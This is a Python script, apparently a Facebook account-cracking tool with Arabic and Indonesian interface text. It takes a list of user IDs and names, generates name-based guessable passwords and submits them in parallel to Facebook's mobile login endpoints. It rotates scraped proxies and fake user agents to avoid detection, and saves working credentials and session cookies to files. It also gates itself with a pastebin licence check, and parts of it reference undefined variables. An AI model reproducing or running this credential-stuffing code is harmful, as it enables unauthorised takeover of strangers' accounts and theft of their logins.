#pylint:disable=E0001
#pylint:disable=E0602
#pylint:disable=E0001

      

        

import requests,bs4,json,os,sys,random,datetime,time,re

import urllib3,rich,base64

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup as parser

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from rich import print as rprint

from rich import pretty

from rich.text import Text as tekz

import os

from bs4 import BeautifulSoup as sop

import requests,bs4,json,os,sys,random,datetime,time,re

import urllib3,rich,base64

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from rich import print as rprint

from rich import pretty

from rich.text import Text as tekz

import time

import webbrowser

from datetime import datetime

from time import sleep

from time import sleep as waktu
import socket
iphane = socket.gethostname()
ipp = socket.gethostbyname(iphane)
url = requests.get('https://pastebin.com/jmfdDjS4').text
if ipp in url:
	print("\033[1;92m ✔️✔️..تم تشغيل الأداه 🌚 @VIP_Decode")
	time.sleep(0.3)
	os.system('clear')
else:
	print(' ')
	print('\033[1;92mوقفت الأدآة دخن لا ضوج 🗿🚬 راسلني حتى افعلها @VIP_Decode')





#leep

#from time import sleep as waktu

#

#now = datetime.datetime.today()

#mm = str(now.month)

#dd = str(now.day)

#yyyy = str(now.year)

#hour = str(now.hour)

#mi = str(now.minute)

#ss = str(now.second)

#

#t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)

#

#

#hours = (now.hour)

#x = datetime.datetime.now()

#g= datetime.datetime(2023,10  , 1, 1, 00 ,0)

#

#if (x.strftime("%x"))>(g.strftime("%x")):

# print('\n\n')

# print("     "+' خلصت بعد كلب كلبي' )

# print('\n\n')

# print(x)

# 

# sys.exit(0)

# 

#

#if (x.strftime("%x"))==(g.strftime("%x")):

#   print('')

#   if(x.strftime("%X"))>(g.strftime("%X")):

#    print('\n\n')

#    print("     "+' انتهت الصلاحيه عليك بمراسلت ريند يفعلك  🖤' )

#    print('\n\n')

#    print(x)

#    

pretty.install()

CON=sol()

#DATE AND TIME

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day



#USER-AGENTS

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text

	open('.prox.txt','w').write(prox) 

except Exception as e:

	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;96m[Mr.IPYTHONI]')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

	a='Mozilla/5.0 (Symbian/3; Series60/'

	b=random.randrange(1, 9)

	c=random.randrange(1, 9)

	d='Nokia'

	e=random.randrange(100, 9999)

	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

	g=random.randrange(1, 9)

	h=random.randrange(1, 4)

	i=random.randrange(1, 4)

	j=random.randrange(1, 4)

	k='Mobile Safari/535.1'

	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

	ugen2.append(uaku)





	aa='Mozilla/5.0 (Linux; U; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c=' en-us; GT-'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)

for x in range(10):

	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'

	b=random.randrange(100, 9999)

	c=random.randrange(100, 9999)

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	h=random.randrange(1, 9)

	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'

	j=random.randrange(1, 9)

	k=random.randrange(1, 9)

	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'

	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

#PROXYGEN

def uaku():

	try:

		ua=open('bbnew.txt','r').read().splitlines()

		for ub in ua:

			ugen.append(ub)

	except:

		a=requests.get('https://raw.githubusercontent.com/PSYCHO-PICCHI/ua/main/bbnew.txt').text

		ua=open('.bbnew.txt','w')

		aa=re.findall('line">(.*?)<',str(a))

		for un in aa:

			ua.write(un+'\n')

		ua=open('.bbnew.txt','r').read().splitlines()

		

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

cokbrut=[]

pwpluss,pwnya=[],[]

#COLOR-CODE

BM = '\x1b[1;97m'

P = '\x1b[1;91m'

M = '\x1b[1;97m'

H = '\x1b[1;97m'

K = '\x1b[1;96m'

B = '\x1b[1;93m'

U = '\x1b[1;96m' 

O = '\x1b[1;95m'

N = '\x1b[0m'    

Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;91m' #RED +

k = '\033[93m' # KUNING +

h = '\x1b[1;97m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[96m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;95m' # BIRU -

p = '\x1b[0;34m' # BIRU +

Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
asu = random.choice([m,k,h,u,b])

print('\n')
#token=input(Z+'token : '+B)
print('\n')
#ID=input(F+'ID    : '+B)

def clear():

    os.system('clear')

    banner()

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "\x1b[1;91mPM"

else:

    a = ltx

    tag = "\x1b[1;96mAM"

#IPYTHONI

def _IPYTHONI_(u):

        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)

def clear():

	os.system('clear')

def back():

	login()

#LOGO

def banner():

	print("""%s

	





\033[1;91m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⢀⣠⣤⣶⣶⣾⣷⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡿⢿⠻⢟⠿⡿⣿⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣯⡹⠤⠑⡌⢲⡰⣡⠇⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡱⣶⣿⣿⣾⣶⢶⣾⣷⣾⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⡷⢳⢛⡛⠿⠿⢫⡜⣿⣿⠟⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡟⣷⣯⡲⣴⠓⡾⣿⣿⣷⣏⠯⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⢎⡿⣿⣿⣷⣯⣽⣿⣯⣻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣞⣷⢮⡷⣏⠿⡿⣿⢿⣷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣷⣿⣾⣿⣿⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣯⣿⣿⣿⣿⣿⡞⢠⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⢶⠛⢁⠢⣙⢿⣿⣿⣿⣿⣿⣿⢟⡰⣀⠞⣻⣒⡤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⢛⠡⢀⠛⠤⠑⠈⠖⡹⢿⣿⣿⣿⢋⠦⠑⠌⡜⢄⡃⢳⣀⠣⠑⠠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡠⠖⠋⢀⠰⣈⢎⠒⠤⣈⠐⡂⢆⡈⠬⢛⢻⣻⠃⣌⠆⡘⡌⡔⣢⠘⡌⢇⡘⡀⠡⡀⠌⠢⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⡟⠡⠌⠠⣘⠲⡌⢎⡜⡡⢆⡱⣈⠔⡠⢑⠢⠼⠿⡈⠕⣌⢒⡱⣐⡦⣙⡔⢪⢰⢡⠂⡜⡌⡇⡔⡄⠀⠀⠀⠀⠀
⠀⠀⢀⣿⡌⡽⢮⠰⣌⢳⡙⢦⡜⣱⣪⣔⢧⡚⣥⢫⠱⣉⠖⡩⢜⡐⢎⠴⣿⣿⣿⣟⡡⢞⢢⡓⣼⠱⡸⡔⡹⡀⠀⠀⠀⠀
⠀⠀⣼⡷⡜⣜⢻⣷⢸⣇⠿⣉⢾⣵⣿⣿⣮⡱⣂⢇⡳⢜⣪⢑⢎⠼⡌⠶⣑⢾⣿⡧⡝⣎⢧⣛⡼⣣⢳⡱⣃⢧⠀⠀⠀⠀
⠀⢰⣿⡗⢎⡧⢏⣷⣿⡜⣧⣝⢮⣛⢿⡹⢫⠵⣑⠮⡱⢎⢶⡩⢎⠶⣉⠟⡼⢿⡿⣳⢩⡜⣹⣞⡷⣭⣳⢳⢍⡬⡇⠀⠀⠀
⠀⢾⣿⣯⢻⣾⣹⣻⣾⣿⡿⣝⢶⡫⡖⣭⢣⣛⢬⢳⣙⡎⣧⠝⣎⠳⡭⢾⣽⣷⣿⣷⣳⣼⣱⢯⣿⣳⢏⣷⡻⣱⣿⡀⠀⠀
⠀⣿⣿⠿⣷⣝⣷⣻⣞⣿⣿⡽⣞⣵⣛⢶⣫⢎⡷⣋⣾⡱⣎⠿⣜⢯⡵⣏⣷⢻⣜⢯⡟⣶⣹⢿⣳⣯⢿⣮⢱⣏⣿⣇⠀⠀
⢠⣿⣿⣟⣶⣻⣞⡷⣯⣿⣷⣻⡵⣾⣹⣞⣧⢿⡼⣽⢶⡻⣼⣛⡾⣣⣟⢾⣞⡻⣞⣧⣟⢶⣯⢿⣿⣽⣳⢏⣿⣹⣚⣖⠄⠀
⢸⣿⣟⡽⣮⢷⡿⢿⡿⣿⣯⣷⣻⣗⡿⣾⣽⣳⢯⣟⡾⣳⣽⣣⣟⢷⡽⣯⢾⣽⣻⣼⣞⡿⣾⣿⣻⣾⣧⣟⢶⣣⣟⡼⣎⠀
⣼⣿⣷⣾⣜⡧⣟⣯⡿⣿⣿⣯⣷⢿⣻⢷⣯⢿⡽⣾⣝⡷⣞⡷⣯⢾⡽⣯⣟⣾⣳⡿⣞⣿⣽⣻⣿⣿⣿⢾⣯⣷⣯⢿⣧⠂
                                 

              

"""%(P))

os.system('clear')

banner()

#MENU

def menu():

	

	_IPYTHONI_(f'\x1b[1;98m1- صيد من الملف ᕙ(  • ‿ •  )ᕗ ')

	_____ΤσΤI_____ = input('\x1b[1;96mSELECT :\x1b[1;97m ')

	if _____ΤσΤI_____ in ['1']:

		F()

		print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m LogOut Successful ')

		exit()

	else:

		print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m NOT SELECT ')

		back()

def error():

	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91mBgarewa Bo Menu')

	time.sleep(2)

	back()

#INPUT-FILE	

def F():

    os.system('clear');

    D().plerr()

    



class D:

	def __init__(self):

		self.id = []

	def plerr(self):

		os.system("clear")

		banner()

		try:

			

			fileX = input ('\x1b[1;93mمسار ملف او اسم ملف : ')

			for line in open(fileX, 'r').readlines():

				id.append(line.strip())

			print(f'\x1b[1;91mCOLECTED ID : \x1b[1;97m'+str(len(id)))

			Settings()

		except IOError:

			print(" \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)

			F()

#SERVER-SETTING			

def Settings():

	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mNEW FB \x1b[1;91m[XERA]\n\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m2\x1b[1;91m]\x1b[1;97mNEW+OLD افضل\x1b[1;93m [BASHTR]')

	hu = input('\x1b[1;96mSELECT : \x1b[1;97m')

	if hu in ['1','01']:

		muda=[]

		for bacot in sorted(id):

			muda.append(bacot)

		bcm=len(muda)

		bcmi=(bcm-1)

		for xmud in range(bcm):

			id2.append(muda[bcmi])

			bcmi -=1

	elif hu in ['2','02']:

		for bacot in id:

			xx = random.randint(0,len(id2))

			id2.insert(xx,bacot)

	else:

		print('\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91mNOT SELECT')

		exit()

	

	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mMOBILE\x1b[1;95m [BESTED]')

	hc = input('\x1b[1;96mSELECT :\x1b[1;97m ')

	if hc in ['1','01']:

		method.append('mobile')

	else:

		method.append('mobile')

	pwplus=input('اكتب حرف n')

	if pwplus in ['y','Y']:

		pwpluss.append('ya')

		print(f'Add Password Manual Minimam 6 Character')

		pwku=input(' \x1b[1;91m\x1b[1;96m\x1b[1;97m Add Password bnusa bahal : ')

		pwkuh=pwku.split(',')

		for xpw in pwkuh:

			pwnya.append(xpw)

	else:

		pwpluss.append('no')

	passwrd()

	exit() 

def passwrd():

	print(f"\x1b[1;97m------------------------------------------------------------")

	print(f"\x1b[1;97m[+] تم تفعيل الاداه بل توفيق ROZHE : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta} ")

	print(f"\x1b[1;97m------------------------------------------------------------")

	with tred(max_workers=30) as pool:

		for yuzong in id2:

			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

			frs = nmf.split(' ')[0]

			pwv = []

			if len(nmf)<6:

				if len(frs)<3:

					pass

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'123123')

					pwv.append(frs+'1000')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

					pwv.append(frs+'123456789')

					pwv.append(frs+'112233')

					pwv.append(frs+'123321')

					pwv.append(frs+'12341234')

					pwv.append(frs+'123456')

					pwv.append(frs+'12345678')

					pwv.append(frs+'1234567')

					pwv.append(frs+'11223344')

					pwv.append(frs+'1122334455')

					pwv.append(frs+'112233445566')

                    #pwv.append(nmf)
					pwv.append('first last')
					pwv.append('firstlast')
					pwv.append('0099887766')
					pwv.append('07700770')
					pwv.append('aaaassss')
					pwv.append('07800780')
					pwv.append('19961996')
					pwv.append('19971997')
					pwv.append('19981998')
					pwv.append('5544332211')
					pwv.append('1234512345')
					pwv.append('1234554321')
					pwv.append('1122334455')
					pwv.append('123456654321')
					pwv.append('zxcvzxcv')
					pwv.append('1q2w3e4r5t')
					pwv.append('qqwweerr')
					pwv.append('12345@12345')
					pwv.append('12345@@@')
					pwv.append('20032003')
			else:

				if len(frs)<3:

					pwv.append(nmf)

				else:

					

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'123123')

					pwv.append(frs+'1000')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

					pwv.append(frs+'123456789')

					pwv.append(frs+'112233')

					pwv.append(frs+'123321')

					pwv.append(frs+'12341234')

					pwv.append(frs+'123456')

					pwv.append(frs+'12345678')

					pwv.append(frs+'1234567')

					pwv.append(frs+'11223344')

					pwv.append(frs+'1122334455')

					pwv.append(frs+'112233445566')

					pwv.append(frs+'2022')

					pwv.append(frs+'123123')

					pwv.append(frs+'1000')

					pwv.append(frs+'112233')

					pwv.append(nmf)

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

					pwv.append(frs+'123456789')

					pwv.append(frs+'112233')

					pwv.append(frs+'123123')

					pwv.append(frs+'123321')

					pwv.append(frs+'12341234')

					pwv.append(frs+'123456')

					pwv.append(frs+'12345678')

					pwv.append(frs+'1234567')

					pwv.append(frs+'11223344')

					pwv.append(frs+'1122334455')

					pwv.append(frs+'112233445566')

					pwv.append(frs+'2022')

					pwv.append(frs+'123123')

					pwv.append(frs+'1000')

					pwv.append(frs+'112233')

					pwv.append(nmf)

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

					pwv.append(frs+'123456789')

					pwv.append(frs+'112233')

					pwv.append(frs+'123123')

					pwv.append(frs+'123321')

					pwv.append(frs+'12341234')

					pwv.append(frs+'123456')

					pwv.append(frs+'12345678')

					pwv.append(frs+'1234567')

					pwv.append(frs+'11223344')

					pwv.append(frs+'1122334455')

					pwv.append(frs+'112233445566')

			if 'ya' in pwpluss:

				for xpwd in pwnya:

					pwv.append(xpwd)

			else:pass

			if 'mobile' in method:

				pool.submit(crack,idf,pwv)

			elif 'free' in method:

				pool.submit(crackfree,idf,pwv)

			elif 'touch' in method:

				pool.submit(cracktouch,idf,pwv)

	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m OK : {h}%s '%(ok))

	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m  RETURN CRACK \x1b[1;97m[Y]\n \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91mEXIT [T]')

	woi = input('\x1b[1;97m SELECT  : ')

	if woi in ['y','Y']:

		back()

	else:

		print(f'\t \x1b[1;91m\x1b[1;96m\x1b[1;97m BYE {u} ')

		time.sleep(2)

		exit()



def crack(idf,pwv):

	global loop,ok,cp

	bo = random.choice([P,h,Z,N,O,U])

	sys.stdout.write(f"\r (ΤσΤ) {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			nip=random.choice(prox)

			proxs= {'http': 'socks4://'+nip}

			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}

			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				statuscp1 = f'\r\x1b[1;92m \n-------------------(ΤσΤ-CP)---------------------- \n└──USER: {idf}\n└──PASS: {pw}\n└──COOKIES: {kuki}'''
				

				

				open('CP/'+cp,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

	
				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				print(f'\r\x1b[1;92m \n-------------------(ΤσΤ-OK)---------------------- \n└──USER: {idf}\n└──PASS: {pw}\n└──COOKIES: {kuki}')

                           

                            

				

				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')

				break

		
			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

def ceker(idf,pw):

	global cp

	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'

	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	ses = requests.Session()

	try:

		hi = ses.get('https://mbasic.facebook.com')

		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')

		jo = ho.find('form')

		data = {}

		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']

		for anj in jo('input'):

			if anj.get('name') in lion:

				data.update({anj.get('name'):anj.get('value')})

		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')

		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))

		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

		cp+=1

		opsi = kent.find_all('option')

		if len(opsi)==0:

			print('\r%s---> Tap Yes / A2F (Check  Login Id Lite/Mbasic%s)'%(hh,x))

		else:

			for opsii in opsi:

				print('\r%s---> %s%s'%(kk,opsii.text,x))

	except Exception as c:

		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))

		print('\r%s---> Cannot Check Options (Check Login In Lite/Basic)%s'%(u,x))

		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

		cp+=1

def cek_opsi():

	c = len(akun)

	hu = '#'%(c)

	cetak(nel(hu, title='CEK OPSI'))

	input(u+'['+h+'•'+u+'] INPUT')

	cek = '# PROSESES CO'

	sol().print(mark(cek, style='green'))

	love = 0

	for kes in akun:

		try:

			try:

				id,pw = kes.split('|')[0],kes.split('|')[1]

			except IndexError:

				time.sleep(2)

				print('\r%s++++ %s ERROR=-     %s'%(b,kes,x))

				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))

				continue

			bi = random.choice([u,k,kk,b,h,hh])

			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()

			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'

			ses = requests.Session()

			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

			hi = ses.get('https://mbasic.facebook.com')

			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')

			if "checkpoint" in ses.cookies.get_dict().keys():

				try:

					jo = ho.find('form')

					data = {}

					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']

					for anj in jo('input'):

						if anj.get('name') in lion:

							data.update({anj.get('name'):anj.get('value')})

					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')

					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

					opsi = kent.find_all('option')

					if len(opsi)==0:

						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))

					else:

						for opsii in opsi:

							print('\r%s---> %s%s'%(kk,opsii.text,x))

				except:

					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))

					print('\r%s---> Cannot Check Options%s'%(u,x))

			elif "c_user" in ses.cookies.get_dict().keys():

				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))

			else:

				print('\r%s++++ %s|%s ----> ERROR       %s'%(x,id,pw,x))

			love+=1

		except requests.exceptions.ConnectionError:

			print('')

			li = '#INTERNET NO CONNECTED'

			sol().print(mark(li, style='red'))

			exit()

	dah = '# DONE'

	sol().print(mark(dah, style='green'))

	exit()



def ToT(kuki):

	session = requests.Session()

